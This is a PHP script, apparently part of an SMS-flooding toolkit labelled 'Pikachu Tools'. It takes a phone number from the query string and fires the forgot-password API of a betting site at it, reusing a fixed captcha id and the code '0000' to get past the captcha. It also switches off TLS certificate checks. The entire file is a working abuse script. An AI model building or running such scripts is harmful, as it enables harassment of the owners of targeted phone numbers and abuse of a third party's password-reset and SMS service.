    <?php
//bhaggo

$url = "https://feapi.unicorn88.xyz/api/member/requestCaptchaCode?captcha_id=6f736b71-8188-4615-bef5-f5a83646d4a8&captcha_code=0000";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp = curl_exec($curl);
curl_close($curl);

// Do not echo the response from url1
$phn1 = $_GET["phone"];
$phn = ltrim($phn1, '0');

$url2 = "https://feapi.unicorn88.xyz/api/member/reqFgtPsw";

// Request to url2
$curl2 = curl_init($url2);
curl_setopt($curl2, CURLOPT_URL, $url2);
curl_setopt($curl2, CURLOPT_POST, true);
curl_setopt($curl2, CURLOPT_RETURNTRANSFER, true);

$headers = array(
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Content-Type: application/x-www-form-urlencoded", // Set content type to URL-encoded
);
curl_setopt($curl2, CURLOPT_HTTPHEADER, $headers);

$data = array(
    'mobile' => $phn,
    'prefix' => '+880',
    'captcha_id' => '6f736b71-8188-4615-bef5-f5a83646d4a8',
    'captcha_code' => '0000'
);

// Convert array to URL-encoded string
$postData = http_build_query($data);

curl_setopt($curl2, CURLOPT_POSTFIELDS, $postData);

// For debug only!
curl_setopt($curl2, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl2, CURLOPT_SSL_VERIFYPEER, false);

$resp2 = curl_exec($curl2);
curl_close($curl2);

echo "Response from Pikachu Tools: ";
echo $resp2;
?>
